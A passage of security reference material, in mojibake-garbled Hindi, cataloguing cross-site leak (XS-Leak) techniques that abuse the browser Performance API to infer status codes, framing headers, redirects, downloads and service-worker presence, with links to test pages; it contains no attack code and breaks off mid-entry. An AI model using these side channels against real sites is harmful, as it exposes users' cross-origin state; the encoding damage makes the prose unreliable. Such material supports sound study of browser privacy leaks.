рдЗрд╕ рдбреЗрдЯрд╛ рдХреА рдкреНрд░рдЪреБрд░рддрд╛ рдХреЛ [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) рдпрд╛ [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) рдЬреИрд╕реА рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдкреНрд░рджрд░реНрд╢рди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдПрдХ рд╡реНрдпрд╛рдкрдХ рджреГрд╢реНрдп рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, API рдирд┐рд╖реНрдкрд╛рджрди рд╕рдордп рдХреЛ рдорд╛рдкрдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдХреЗ рдмреАрдЪ рдХреЗ рдЕрдВрддрд░ рдХреА рдЧрдгрдирд╛ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ Chrome рдЬреИрд╕реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ рдХреБрдЫ рдСрдкрд░реЗрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП, `performance.now()` рдХреА рд╕рдЯреАрдХрддрд╛ рдорд┐рд▓реАрд╕реЗрдХрдВрдб рддрдХ рд╕реАрдорд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЬреЛ рд╕рдордп рдорд╛рдк рдХреА рдмрд╛рд░реАрдХреА рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИред

рд╕рдордп рдорд╛рдк рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдкреНрд░рджрд░реНрд╢рди API рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, Chrome рдореЗрдВ `performance` рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдкреГрд╖реНрдареЛрдВ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдпрд╛ рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ `X-Frame-Options` рдХреЗ рд▓рд╛рдЧреВ рд╣реЛрдиреЗ рдХрд╛ рд╕рдВрдХреЗрдд рджреЗ рд╕рдХрддреА рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдпрджрд┐ рдХрд┐рд╕реА рдкреГрд╖реНрда рдХреЛ `X-Frame-Options` рдХреЗ рдХрд╛рд░рдг рдПрдХ рдлреНрд░реЗрдо рдореЗрдВ рд░реЗрдВрдбрд░ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ `performance` рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рдкреГрд╖реНрда рдХреА рдлреНрд░реЗрдорд┐рдВрдЧ рдиреАрддрд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рд╕реВрдХреНрд╖реНрдо рд╕рдВрдХреЗрдд рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

### Error Leak

* **Inclusion Methods**: Frames, HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** рдПрдХ рдЕрдиреБрд░реЛрдз рдЬреЛ рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХрд╛ рдкрд░рд┐рдгрд╛рдо рджреЗрддрд╛ рд╣реИ, рд╕рдВрд╕рд╛рдзрди рд╕рдордп рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдирд╣реАрдВ рдмрдирд╛рдПрдЧрд╛ред
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

рдпрд╣ **HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реНрдерд┐рддрд┐ рдХреЛрдб** рдХреЗ рдмреАрдЪ **рдЕрдВрддрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬреЛ рдЕрдиреБрд░реЛрдз **рддреНрд░реБрдЯрд┐** рдХрд╛ рдкрд░рд┐рдгрд╛рдо рджреЗрддреЗ рд╣реИрдВ рд╡реЗ **рдкреНрд░рджрд░реНрд╢рди рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐** рдирд╣реАрдВ рдмрдирд╛рддреЗ рд╣реИрдВред

### Style Reload Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдмрдЧ рдХреЗ рдХрд╛рд░рдг, рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХрд╛ рдкрд░рд┐рдгрд╛рдо рджреЗрдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреБрд░реЛрдз рджреЛ рдмрд╛рд░ рд▓реЛрдб рд╣реЛрддреЗ рд╣реИрдВред
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рдореЗрдВ рдпрд╣ рднреА рдкрд╣рдЪрд╛рдирд╛ рдЧрдпрд╛ рдХрд┐ GC рдореЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдмрдЧ рдХреЗ рджреЛ рдорд╛рдорд▓реЗ рд╣реИрдВ рдЬреЛ **рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рджреЛ рдмрд╛рд░ рд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рд╡реЗ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╡рд┐рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ**ред рдЗрд╕рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдкреНрд░рджрд░реНрд╢рди API рдореЗрдВ рдХрдИ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдореЗрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЗрд╕реЗ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### Request Merging Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХрд╛ рдкрд░рд┐рдгрд╛рдо рджреЗрдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдорд░реНрдЬ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

рдпрд╣ рддрдХрдиреАрдХ рдЙрд╕ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдкрд╛рдИ рдЧрдИ рдереА рдЬреЛ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рдкреЗрдкрд░ рдореЗрдВ рдереА рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреЛрдИ рд╡рд┐рд╡рд░рдг рдирд╣реАрдВ рдорд┐рд▓рд╛ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЖрдк рдЗрд╕реЗ [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) рдореЗрдВ рд╕реНрд░реЛрдд рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** рдЦрд╛рд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рд╕рдВрд╕рд╛рдзрди рд╕рдордп рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпрд╛рдБ рдирд╣реАрдВ рдмрдирд╛рддреА рд╣реИрдВред
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдпрд╣ рдкрд╣рдЪрд╛рди рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдПрдХ рдЦрд╛рд▓реА HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╢рд░реАрд░ рдореЗрдВ рд╣реБрдЖ рдХреНрдпреЛрдВрдХрд┐ **рдЦрд╛рд▓реА рдкреГрд╖реНрда рдХреБрдЫ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ рдкреНрд░рджрд░реНрд╢рди рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдирд╣реАрдВ рдмрдирд╛рддреЗ рд╣реИрдВ**ред

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** рд╕реБрд░рдХреНрд╖рд╛ рдЖрд╢реНрд╡рд╛рд╕рди рдореЗрдВ XSS рдСрдбрд┐рдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рд╣рдорд▓рд╛рд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд░рдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡реЗрдмрдкреГрд╖реНрда рддрддреНрд╡реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рддреИрдпрд╛рд░ рдХрд┐рдП рдЧрдП рдкреЗрд▓реЛрдб рдСрдбрд┐рдЯрд░ рдХреЗ рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рддрдВрддреНрд░ рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рддреЗ рд╣реИрдВред
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

рд╕реБрд░рдХреНрд╖рд╛ рдЖрд╢реНрд╡рд╛рд╕рди (SA) рдореЗрдВ, XSS рдСрдбрд┐рдЯрд░, рдЬреЛ рдореВрд▓ рд░реВрдк рд╕реЗ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ (XSS) рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдкрд░реАрдд рд░реВрдк рд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╡рд┐рд╢реЗрд╖рддрд╛ Google Chrome (GC) рд╕реЗ рд╣рдЯрд╛ рджреА рдЧрдИ рдереА, рд▓реЗрдХрд┐рди рдпрд╣ SA рдореЗрдВ рдЕрднреА рднреА рдореМрдЬреВрдж рд╣реИред 2013 рдореЗрдВ, рдмреНрд░реМрди рдФрд░ рд╣рд╛рдЗрдбрд░рд┐рдЪ рдиреЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдХрд┐ XSS рдСрдбрд┐рдЯрд░ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рд╡реИрдз рд╕реНрдХреНрд░рд┐рдкреНрдЯреЛрдВ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЭреВрдареЗ рд╕рдХрд╛рд░рд╛рддреНрдордХ рдЙрддреНрдкрдиреНрди рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рдиреЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдФрд░ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреГрд╖реНрдареЛрдВ рдкрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рддрдХрдиреАрдХреЛрдВ рдХрд╛ рд╡рд┐рдХрд╛рд╕ рдХрд┐рдпрд╛, рдЬрд┐рд╕реЗ XS-Leaks рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдкрд╣рд▓реЗ рдЯреЗрд░рд╛рдбрд╛ рджреНрд╡рд╛рд░рд╛ рд░рд┐рдкреЛрд░реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рд╣реЗрдпреЗрд╕ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╡рд┐рд╕реНрддреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рд╣рд╛рд▓рд╛рдБрдХрд┐ рдпреЗ рддрдХрдиреАрдХреЗрдВ GC рдореЗрдВ XSS рдСрдбрд┐рдЯрд░ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢рд┐рд╖реНрдЯ рдереАрдВ, рдпрд╣ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ SA рдореЗрдВ, XSS рдСрдбрд┐рдЯрд░ рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реБрджреНрдз рдкреГрд╖реНрда рдкреНрд░рджрд░реНрд╢рди API рдореЗрдВ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпрд╛рдБ рдЙрддреНрдкрдиреНрди рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рд╣реЛрдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИред

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** X-Frame-Options рд╣реЗрдбрд░ рд╡рд╛рд▓рд╛ рд╕рдВрд╕рд╛рдзрди рд╕рдВрд╕рд╛рдзрди рд╕рдордп рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдирд╣реАрдВ рдмрдирд╛рддрд╛ рд╣реИред
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

рдпрджрд┐ рдХрд┐рд╕реА рдкреГрд╖реНрда рдХреЛ **iframe** рдореЗрдВ **рд░реЗрдВрдбрд░** рдХрд░рдиреЗ рдХреА **рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ**, рддреЛ рдпрд╣ **рдкреНрд░рджрд░реНрд╢рди рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐** рдирд╣реАрдВ рдмрдирд╛рддрд╛ рд╣реИред рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░ **`X-Frame-Options`** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдпрджрд┐ рдЖрдк рдПрдХ **embed** **tag** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рд╡рд╣реА рд╣реЛрддрд╛ рд╣реИред

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** рдбрд╛рдЙрдирд▓реЛрдб рдкреНрд░рджрд░реНрд╢рди API рдореЗрдВ рд╕рдВрд╕рд╛рдзрди рд╕рдордп рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпрд╛рдБ рдирд╣реАрдВ рдмрдирд╛рддреЗ рд╣реИрдВред
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

рдЙрд╕реА рддрд░рд╣, XS-Leak рдХреЗ рд╡рд░реНрдгрд┐рдд рдПрдХ **рд╕рдВрд╕рд╛рдзрди рдЬреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ ContentDisposition рд╣реЗрдбрд░ рдХреЗ рдХрд╛рд░рдг, рднреА **рдкреНрд░рджрд░реНрд╢рди рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐** рдирд╣реАрдВ рдмрдирд╛рддрд╛ рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рд╕рднреА рдкреНрд░рдореБрдЦ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ рдХрд╛рдо рдХрд░рддреА рд╣реИред

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** рд╕рдВрд╕рд╛рдзрди рд╕рдордп рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рдкреНрд░рд╛рд░рдВрдн рд╕рдордп рдХреЛ рд▓реАрдХ рдХрд░рддреА рд╣реИред
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

рд╣рдордиреЗ рдПрдХ XS-Leak рдЙрджрд╛рд╣рд░рдг рдкрд╛рдпрд╛ рдЬреЛ рдХреБрдЫ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рд▓реЙрдЧ рдХрд░рддреЗ рд╣реИрдВред рдорд╛рдирдХ рдПрдХ рдЙрдкрд╕рдореБрдЪреНрдЪрдп рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рд╢реВрдиреНрдп рдкрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдБрдХрд┐, **SA** рдореЗрдВ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда** рджреНрд╡рд╛рд░рд╛ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, **Performance API** рдХреЛ рдХреНрд╡реЗрд░реА рдХрд░рдХреЗ рдФрд░ **redirectStart рд╕рдордп рдбреЗрдЯрд╛** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗред

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛрдиреЗ рдкрд░ рд╕рдордп рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдХреА рдЕрд╡рдзрд┐ рдирдХрд╛рд░рд╛рддреНрдордХ рд╣реЛрддреА рд╣реИред
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC рдореЗрдВ, **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП **рдЕрд╡рдзрд┐** **рдирдХрд╛рд░рд╛рддреНрдордХ** рд╣реЛрддреА рд╣реИ рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЗрд╕реЗ **рдЕрд▓рдЧ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЙрди рдЕрдиреБрд░реЛрдзреЛрдВ рд╕реЗ рдЬреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВред

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** CORP рдХреЗ рд╕рд╛рде рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрди рд╕рдВрд╕рд╛рдзрди рд╕рдордп рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпрд╛рдБ рдирд╣реАрдВ рдмрдирд╛рддреЗ рд╣реИрдВред
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, **nextHopProtocol рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐** рдХреЛ рд▓реАрдХ рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред GC рдореЗрдВ, рдЬрдм **CORP рд╣реЗрдбрд░** рд╕реЗрдЯ рд╣реЛрддрд╛ рд╣реИ, рддреЛ nextHopProtocol **рдЦрд╛рд▓реА** рд╣реЛрдЧрд╛ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ SA CORP-рд╕рдХреНрд╖рдо рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рджрд░реНрд╢рди рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдирд╣реАрдВ рдмрдирд╛рдПрдЧрд╛ред

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: API Usage
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдореВрд▓ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛ рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдкрдВрдЬреАрдХреГрдд рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдЗрд╕рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВред
* **Code Example**:

рд╕реЗрд╡рд╛ рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдЗрд╡реЗрдВрдЯ-рдЪрд╛рд▓рд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрджрд░реНрдн рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рдореВрд▓ рдкрд░ рдЪрд▓рддреЗ рд╣реИрдВред рд╡реЗ рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдХреЗ рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рдореЗрдВ рдЪрд▓рддреЗ рд╣реИрдВ рдФрд░ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ, рд╕рдВрд╢реЛрдзрд┐рдд рдФрд░ **рдХреИрд╢** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдСрдлрд╝рд▓рд╛рдЗрди рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рдпрджрд┐ рдПрдХ **рд╕рдВрд╕рд╛рдзрди рдХреИрд╢** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдПрдХ **рд╕реЗрд╡рд╛ рдХрд╛рд░реНрдпрдХрд░реНрддрд╛** рджреНрд╡рд╛рд░рд╛, рддреЛ рдЗрд╕реЗ **iframe** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рд╕рдВрд╕рд╛рдзрди **рд╕реЗрд╡рд╛ рдХрд╛рд░реНрдпрдХрд░реНрддрд╛ рдХреИрд╢** рд╕реЗ **рд▓реЛрдб** рд╣реЛрдЧрд╛ред\
